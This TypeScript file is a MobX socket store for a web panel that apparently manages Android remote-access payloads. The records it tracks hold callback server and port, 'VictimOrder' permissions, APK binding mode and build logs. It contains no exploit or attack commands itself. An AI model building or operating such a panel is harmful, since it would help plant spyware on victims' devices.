import { action, makeAutoObservable, makeObservable, observable } from 'mobx';
import { io, type Socket } from 'socket.io-client';

import { SOCKET_NAMESPACE_WEB } from '../../common/constants';
import {
    type BindingMethod,
    ConnectionStatus,
    type PackagingMode,
    type PayloadLogStatus,
    type PayloadStatus,
    ServerToWebEvents,
    type VictimOrder,
} from '../../common/enums';
import {
    type IPayloadEntity,
    type IPayloadLogEntity,
    type IServerToWebEvents,
    type IWebToServerEvents,
} from '../../common/interfaces';

export class PayloadLogItem implements IPayloadLogEntity {
    public id!: string;
    public payloadId!: string;
    public status!: PayloadLogStatus;
    public message!: string;
    public error?: string | undefined;
    public createdAt!: number;
    public updatedAt!: number;

    public constructor(data: IPayloadLogEntity) {
        this.copyFrom(data);

        makeAutoObservable(this);
    }

    public copyFrom(data: IPayloadLogEntity): this {
        this.id = data.id;
        this.payloadId = data.payloadId;
        this.status = data.status;
        this.message = data.message;
        this.error = data.error;
        this.createdAt = data.createdAt;
        this.updatedAt = data.updatedAt;

        return this;
    }
}

export class PayloadItem implements IPayloadEntity {
    public id!: string;
    public server!: string;
    public port!: number;
    public permissions!: VictimOrder[];
    public packagingMode!: PackagingMode;
    public bindingMethod!: BindingMethod;
    public logs!: PayloadLogItem[];
    public existingAPKName?: string | undefined;
    public status!: PayloadStatus;
    public createdAt!: number;
    public updatedAt!: number;

    public constructor(data: IPayloadEntity) {
        this.copyFrom(data);

        makeAutoObservable(this);
    }

    public copyFrom(data: IPayloadEntity): this {
        this.id = data.id;
        this.server = data.server;
        this.port = data.port;
        this.permissions = data.permissions;
        this.packagingMode = data.packagingMode;
        this.bindingMethod = data.bindingMethod;
        this.logs =
            data.logs
                ?.map(
                    (log) =>
                        this.logs
                            ?.find((l) => l.id === log.id)
                            ?.copyFrom(log) ?? new PayloadLogItem(log),
                )
                .sort((a, b) => a.createdAt - b.createdAt) || [];
        this.existingAPKName = data.existingAPKName;
        this.status = data.status;
        this.createdAt = data.createdAt;
        this.updatedAt = data.updatedAt;

        return this;
    }

    public addLog(log: IPayloadLogEntity): void {
        this.logs.push(new PayloadLogItem(log));
    }

    public updateLog(log: IPayloadLogEntity): void {
        this.logs?.find((l) => l.id === log.id)?.copyFrom(log);
    }
}

export class PayloadsSocketStore {
    public readonly socket: Socket<IServerToWebEvents, IWebToServerEvents>;

    public connectionStatus: ConnectionStatus = ConnectionStatus.DISCONNECTED;
    public payloads: PayloadItem[] = [];

    constructor() {
        this.socket = io(SOCKET_NAMESPACE_WEB, {
            query: {
                page: 'payloads',
            },
            autoConnect: false,
            forceNew: true,
        });

        this.setupListeners().catch((error) => {
            console.error('Failed to setup socket listeners!', error);
        });

        makeObservable(this, {
            connectionStatus: observable,
            payloads: observable,
            setConnectionStatus: action,
            setPayloads: action,
            addPayload: action,
            updatePayload: action,
            deletePayload: action,
        });
    }

    private async setupListeners(): Promise<void> {
        this.socket.on('connect', () => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log('Connected to socket server!');
        });

        this.socket.on('disconnect', (reason, description) => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log('Disconnected from socket server!', {
                reason,
                description,
            });
        });

        this.socket.io.on('close', (reason, description) => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log('Socket server closed!', { reason, description });
        });

        this.socket.io.on('error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Socket error!', error);
        });

        this.socket.io.on('reconnect', (attempt) => {
            this.connectionStatus = ConnectionStatus.CONNECTED;
            console.log('Reconnected to socket server!', attempt);
        });

        this.socket.io.on('reconnect_attempt', (attempt) => {
            this.connectionStatus = ConnectionStatus.CONNECTING;
            console.log('Attempting to reconnect to socket server!', attempt);
        });

        this.socket.io.on('reconnect_error', (err) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Error reconnecting to socket server!', err);
        });

        this.socket.io.on('reconnect_failed', () => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Failed to reconnect to socket server!');
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_LIST, (payloads) => {
            this.setPayloads(payloads);
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_ADDED, (payload) => {
            this.addPayload(payload);
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_UPDATED, (payload) => {
            this.updatePayload(payload);
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_DELETED, (payloadId) => {
            this.deletePayload(payloadId);
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_LOG_ADDED, (payloadLog) => {
            this.payloads
                ?.find((p) => p.id === payloadLog.payloadId)
                ?.addLog(payloadLog);
        });

        this.socket.on(ServerToWebEvents.PAYLOAD_LOG_UPDATED, (payloadLog) => {
            this.payloads
                ?.find((p) => p.id === payloadLog.payloadId)
                ?.updateLog(payloadLog);
        });
    }

    public setConnectionStatus(connectionStatus: ConnectionStatus): void {
        this.connectionStatus = connectionStatus;
    }

    public setPayloads(payloads: IPayloadEntity[]): void {
        this.payloads = payloads.map(
            (payload) =>
                this.payloads
                    ?.find((p) => p.id === payload.id)
                    ?.copyFrom(payload) ?? new PayloadItem(payload),
        );
    }

    public addPayload(payload: IPayloadEntity): void {
        this.payloads.push(new PayloadItem(payload));
    }

    public updatePayload(payload: IPayloadEntity): void {
        this.payloads?.find((p) => p.id === payload.id)?.copyFrom(payload);
    }

    public deletePayload(payloadId: string): void {
        this.payloads = this.payloads.filter((p) => p.id !== payloadId);
    }

    public connect(): void {
        this.socket.connect();
    }

    public disconnect(): void {
        this.socket.disconnect();
    }
}
